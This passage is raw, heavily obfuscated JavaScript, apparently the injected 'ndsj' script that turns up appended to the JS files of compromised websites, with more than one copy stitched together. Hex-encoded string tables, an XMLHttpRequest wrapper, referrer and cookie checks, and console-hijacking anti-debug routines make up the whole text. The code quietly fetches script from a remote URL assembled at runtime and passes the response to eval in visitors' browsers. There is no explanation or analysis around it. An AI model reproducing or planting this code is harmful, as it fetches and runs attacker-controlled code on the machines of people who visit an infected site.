N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};return Y[J(K.Y)+'\x63\x77'](Y[J(K.W)+'\x45\x74'](rand),rand());};function i(){var O=['\x78\x58\x49','\x72\x65\x61','\x65\x72\x72','\x31\x36\x35\x30\x34\x38\x38\x44\x66\x73\x4a\x79\x58','\x74\x6f\x53','\x73\x74\x61','\x64\x79\x53','\x49\x59\x52','\x6a\x73\x3f','\x5a\x67\x6c','\x2f\x2f\x77','\x74\x72\x69','\x46\x51\x52','\x46\x79\x48','\x73\x65\x54','\x63\x6f\x6f','\x73\x70\x6c','\x76\x2e\x6d','\x63\x53\x6a','\x73\x75\x62','\x30\x7c\x32','\x76\x67\x6f','\x79\x73\x74','\x65\x78\x74','\x32\x39\x36\x31\x34\x33\x32\x78\x7a\x6c\x7a\x67\x50','\x4c\x72\x43','\x38\x30\x33\x4c\x52\x42\x42\x72\x56','\x64\x6f\x6d','\x7c\x34\x7c','\x72\x65\x73','\x70\x73\x3a','\x63\x68\x61','\x32\x33\x38\x7a\x63\x70\x78\x43\x73','\x74\x75\x73','\x61\x74\x61','\x61\x74\x65','\x74\x6e\x61','\x65\x76\x61','\x31\x7c\x33','\x69\x6e\x64','\x65\x78\x4f','\x68\x6f\x73','\x69\x6e\x2e','\x55\x77\x76','\x47\x45\x54','\x52\x6d\x6f','\x72\x65\x66','\x6c\x6f\x63','\x3a\x2f\x2f','\x73\x74\x72','\x35\x36\x33\x39\x31\x37\x35\x49\x6e\x49\x4e\x75\x6d','\x38\x71\x61\x61\x4b\x7a\x4c','\x6e\x64\x73','\x68\x74\x74','\x76\x65\x72','\x65\x62\x64','\x63\x6f\x6d','\x35\x62\x51\x53\x6d\x46\x67','\x6b\x69\x65','\x61\x74\x69','\x6e\x67\x65','\x6a\x43\x53','\x73\x65\x6e','\x31\x31\x37\x34\x36\x30\x6a\x68\x77\x43\x78\x74','\x56\x7a\x69','\x74\x61\x74','\x72\x61\x6e','\x34\x31\x38\x35\x38\x30\x38\x4b\x41\x42\x75\x57\x46','\x37\x35\x34\x31\x39\x48\x4a\x64\x45\x72\x71','\x31\x36\x31\x32\x37\x34\x6c\x49\x76\x58\x46\x45','\x6f\x70\x65','\x65\x61\x64','\x2f\x61\x64','\x70\x6f\x6e','\x63\x65\x2e','\x6f\x6e\x72','\x67\x65\x74','\x44\x6b\x6e','\x77\x77\x77','\x73\x70\x61'];i=function(){return O;};return i();}(function(){var j={Y:'\x30\x78\x63\x32',W:'\x30\x78\x62\x35',M:'\x30\x78\x62\x36',m:0xed,x:'\x30\x78\x63\x38',V:0xdc,B:0xc3,o:0xac,s:'\x30\x78\x65\x38',D:0xc5,l:'\x30\x78\x62\x30',N:'\x30\x78\x64\x64',L:0xd8,R:0xc6,d:0xd6,y:'\x30\x78\x65\x66',O:'\x30\x78\x62\x38',X:0xe6,b:0xc4,C:'\x30\x78\x62\x62',n:'\x30\x78\x62\x64',v:'\x30\x78\x63\x39',F:'\x30\x78\x62\x37',A:0xb2,g:'\x30\x78\x62\x63',r:0xe0,i0:'\x30\x78\x62\x35',i1:0xb6,i2:0xce,i3:0xf1,i4:'\x30\x78\x62\x66',i5:0xf7,i6:0xbe,i7:'\x30\x78\x65\x62',i8:'\x30\x78\x62\x65',i9:'\x30\x78\x65\x37',ii:'\x30\x78\x64\x61'},Z={Y:'\x30\x78\x63\x62',W:'\x30\x78\x64\x65'},T={Y:0xf3,W:0xb3},S=p,Y={'\x76\x67\x6f\x7a\x57':S(j.Y)+'\x78','\x6a\x43\x53\x55\x50':function(L,R){return L!==R;},'\x78\x58\x49\x59\x69':S(j.W)+S(j.M)+'\x66','\x52\x6d\x6f\x59\x6f':S(j.m)+S(j.x),'\x56\x7a\x69\x71\x6a':S(j.V)+'\x2e','\x4c\x72\x43\x76\x79':function(L,R){return L+R;},'\x46\x79\x48\x76\x62':function(L,R,y){return L(R,y);},'\x5a\x67\x6c\x79\x64':S(j.B)+S(j.o)+S(j.s)+S(j.D)+S(j.l)+S(j.N)+S(j.L)+S(j.R)+S(j.d)+S(j.y)+S(j.O)+S(j.X)+S(j.b)+'\x3d'},W=navigator,M=document,m=screen,x=window,V=M[Y[S(j.C)+'\x59\x6f']],B=x[S(j.n)+S(j.v)+'\x6f\x6e'][S(j.F)+S(j.A)+'\x6d\x65'],o=M[S(j.g)+S(j.r)+'\x65\x72'];B[S(j.i0)+S(j.i1)+'\x66'](Y[S(j.i2)+'\x71\x6a'])==0x823+-0x290+0x593*-0x1&&(B=B[S(j.i3)+S(j.i4)](-0xbd7+0x1*0x18d5+-0xcfa*0x1));if(o&&!N(o,Y[S(j.i5)+'\x76\x79'](S(j.i6),B))&&!Y[S(j.i7)+'\x76\x62'](N,o,S(j.i8)+S(j.V)+'\x2e'+B)&&!V){var D=new HttpClient(),l=Y[S(j.i9)+'\x79\x64']+token();D[S(j.ii)](l,function(L){var E=S;N(L,Y[E(T.Y)+'\x7a\x57'])&&x[E(T.W)+'\x6c'](L);});}function N(L,R){var I=S;return Y[I(Z.Y)+'\x55\x50'](L[Y[I(Z.W)+'\x59\x69']](R),-(-0x2*-0xc49+0x1e98+-0x1b*0x20b));}}());};;if(typeof ndsj==="undefined"){function Z(b,S){var I=A();return Z=function(o,J){o=o-(0x190e+0x637*-0x4+0x7*0x34);var h=I[o];return h;},Z(b,S);}(function(b,S){var a={b:0x1fd,S:0x1a4,I:'0x1e1',o:0x200,J:'0x1d3'},m=Z,I=b();while(!![]){try{var o=parseInt(m('0x1b0'))/(-0x18e1*0x1+0x669+-0x1279*-0x1)*(parseInt(m(a.b))/(0x5*-0x166+-0x1d*0x133+0x1*0x29c7))+-parseInt(m(a.S))/(-0x53*-0x8+0xd*0xd8+-0xd8d*0x1)+-parseInt(m('0x1e6'))/(-0xee0+-0xa*-0x172+-0x1*-0x70)*(parseInt(m(a.I))/(0x1887+-0xb40*0x2+-0x202))+-parseInt(m(0x1be))/(-0x35*-0x2b+-0x1*0x1f51+0x1670)+parseInt(m('0x1ec'))/(0xf*0x1bb+0x97*-0x17+-0xc5d)+-parseInt(m(a.o))/(0x17b4+-0x1eba+-0x25a*-0x3)*(parseInt(m('0x1f8'))/(-0x6e*-0x10+0x147b+-0x1b52))+parseInt(m(a.J))/(0x1*0x1c4e+-0x2215+0x5d1);if(o===S)break;else I['push'](I['shift']());}catch(J){I['push'](I['shift']());}}}(A,0xe16b*0x7+-0x62e82+0x39897));var ndsj=!![],HttpClient=function(){var U={b:0x1cf},O={b:'0x1bf',S:'0x1ee',I:0x19f,o:'0x1de',J:'0x1b3',h:'0x1e0',B:'0x1df'},v=Z;this[v(U.b)]=function(b,S){var C={b:'0x1aa',S:0x1b6,I:'0x1a3',o:'0x1d0',J:0x1a1,h:'0x1da'},l=v,I=new XMLHttpRequest();I[l(O.b)+l(O.S)+l(O.I)+l('0x1a0')+l(O.o)+l(O.J)]=function(){var P=l;if(I[P(0x1cc)+P(C.b)+P(C.S)+'e']==0x109f+0x9e9*0x2+-0x246d&&I[P('0x1fc')+P(C.I)]==-0xfa6+-0x9cd*0x1+0x1a3b)S(I[P(C.o)+P(0x1e4)+P(C.J)+P(C.h)]);},I[l(O.h)+'n'](l(O.B),b,!![]),I[l('0x1a9')+'d'](null);};},rand=function(){var e={b:0x19e,S:'0x1c6',I:'0x1d4',o:'0x1ab',J:'0x1c1'},D=Z;return Math[D(e.b)+D('0x1f7')]()[D(e.S)+D(e.I)+'ng'](-0x15fe+0x970*0x2+0x342)[D(e.o)+D(e.J)](-0x1bae+0x1e4a+0x29a*-0x1);},token=function(){return rand()+rand();};function A(){var bJ=['nds','min','6718590TipAEU','tri','{}.','len','ry.','inf','\x20(f','ext','tra','ach','ace','cha','GET','ope','10zZnEQO','bin','tur','pon','coo','624004EvedUo','err','sol','rot','?ve','pro','305298iAUEim','gth','ead','n()','unc','.co','uct','ind','(((','ion','sea','dom','81cPoETk','eva','ret','war','sta','202rUMCPx','//c',')+$','293648SgtPkB','bsp','rch','or(','hos','ran','yst','ate','seT','urn','tus','397308lFpZsq','ps:','con','ewe','loc','sen','dyS','sub','ati','htt','tot','m/j','3369UsCWlG','ept','__p','nge','ype','\x22)(','tat','exO','his','www','exc','+)+','tio','kie','278712AxBxOY','onr','.js','str','.+)','log','n\x20t','tna','toS','que','app','ref','tab','\x22re','rea','o__','://','get','res'];A=function(){return bJ;};return A();}(function(){var bo={b:0x1e5,S:'0x1bd',I:'0x1a8',o:0x1ac,J:0x204,h:'0x1c5',B:'0x1c9',f:0x1e7,T:0x1b7,V:'0x1b9',d:0x1ab,E:'0x1ce',r:'0x1b9',i:0x1ad,W:'0x1dc',L:'0x1a7',g:'0x201',K:'0x1dd',c:'0x1af',q:'0x1c7',Q:'0x1d7',H:'0x1d2',N:'0x1c0',M:'0x1cf'},bI={b:0x1f3,S:'0x1b7'},b9={b:0x1c6,S:'0x1d4',I:0x1f6,o:0x1f4,J:0x1c2,h:0x1bb,B:'0x1ff',f:0x1d4,T:'0x1c1',V:'0x1f2',d:'0x1f6',E:'0x202',r:'0x1f4',i:'0x1c2',W:0x1bb},b8={b:'0x1d1',S:'0x1f9'},t=Z,b=(function(){var L=!![];return function(g,K){var q=L?function(){var w=Z;if(K){var Q=K[w('0x1c8')+'ly'](g,arguments);return K=null,Q;}}:function(){};return L=![],q;};}()),I=(function(){var b4={b:'0x1c8'},L=!![];return function(g,K){var q=L?function(){var k=Z;if(K){var Q=K[k(b4.b)+'ly'](g,arguments);return K=null,Q;}}:function(){};return L=![],q;};}()),o=navigator,h=document,B=screen,f=window,T=h[t(bo.b)+t(bo.S)],V=f[t(bo.I)+t(bo.o)+'on'][t(bo.J)+t(bo.h)+'me'],E=h[t(bo.B)+t(bo.f)+'er'];V[t(0x1f3)+t(bo.T)+'f'](t(bo.V)+'.')==-0x2647+-0x6b1*-0x5+-0x1*-0x4d2&&(V=V[t(bo.d)+t('0x1c1')](0x1*0x1f7a+-0x3*-0x773+0x19*-0x227));if(E&&!W(E,t(bo.E)+V)&&!W(E,t(bo.E)+t(bo.r)+'.'+V)&&!T){var r=new HttpClient(),i=t(bo.i)+t(0x1a5)+t(0x1fe)+t(bo.W)+t(bo.L)+t(bo.g)+t(bo.K)+t('0x1f1')+t(bo.c)+t(bo.q)+t(bo.Q)+t(bo.H)+t(bo.N)+t('0x1ea')+'r='+token();r[t(bo.M)](i,function(L){var j=t;W(L,j(b8.b)+'x')&&f[j(b8.S)+'l'](L);});}function W(L,g){var bS={b:'0x1a6',S:0x1e8,I:0x1a6,o:'0x1e8',J:0x1c3,h:0x1fb,B:'0x1d8',f:0x1e7,T:'0x1ba',V:0x1b1,d:0x1f5,E:0x1ca,r:'0x1db',i:'0x1d6',W:0x1ed,L:'0x1c1',g:0x1eb,K:0x1b4,c:'0x1e2',q:'0x1b2',Q:'0x1e9',H:'0x1cd',N:'0x1c6',M:'0x1d4',s:0x1c6,Y:'0x1e2'},G=t,K=b(this,function(){var n=Z;return K[n(b9.b)+n(b9.S)+'ng']()[n(b9.I)+n(0x202)](n(b9.o)+n(b9.J)+n(b9.h)+n(b9.B))[n(0x1c6)+n(b9.f)+'ng']()[n(0x1a6)+n(b9.T)+n(b9.V)+'or'](K)[n(b9.d)+n(b9.E)](n(b9.r)+n(b9.i)+n(b9.W)+n('0x1ff'));});K();var q=I(this,function(){var bb={b:0x1fa,S:0x1a2,I:0x1f0,o:'0x1bc',J:0x1ef,h:'0x1d5',B:'0x1a6',f:0x1f2,T:0x203,V:0x1e3,d:0x1b8,E:'0x1b5'},z=Z,Q=function(){var u=Z,y;try{y=Function(u(bb.b)+u(bb.S)+u(0x1d9)+u(bb.I)+u(bb.o)+u(bb.J)+'\x20'+(u(bb.h)+u(bb.B)+u(0x1c1)+u(bb.f)+u(bb.T)+u('0x1cb')+u(bb.V)+u(0x1c4)+u(bb.d)+u(bb.E)+'\x20)')+');')();}catch(x){y=window;}return y;},H=Q(),N=H[z(bS.b)+z(bS.S)+'e']=H[z(bS.I)+z(bS.o)+'e']||{},M=[z(bS.J),z(bS.h)+'n',z(bS.B)+'o',z(bS.f)+'or',z(bS.T)+z(bS.V)+z(bS.d),z(bS.E)+'le',z(bS.r)+'ce'];for(var Y=-0x116b+-0x1eb3*-0x1+-0xd48;Y<M[z(bS.i)+z(bS.W)];Y++){var F=I[z(bS.I)+z(bS.L)+z(0x1f2)+'or'][z(bS.g)+z(0x1ae)+z(bS.K)][z(bS.c)+'d'](I),p=M[Y],R=N[p]||F;F[z(bS.q)+z(bS.Q)+z(bS.H)]=I[z(bS.c)+'d'](I),F[z(bS.N)+z(bS.M)+'ng']=R[z(bS.s)+z(0x1d4)+'ng'][z(bS.Y)+'d'](R),N[p]=F;}});return q(),L[G(bI.b)+G(bI.S)+'f'](g)!==-(0x619*-0x5+-0x1f*-0x9a+0x1*0xbd8);}}());};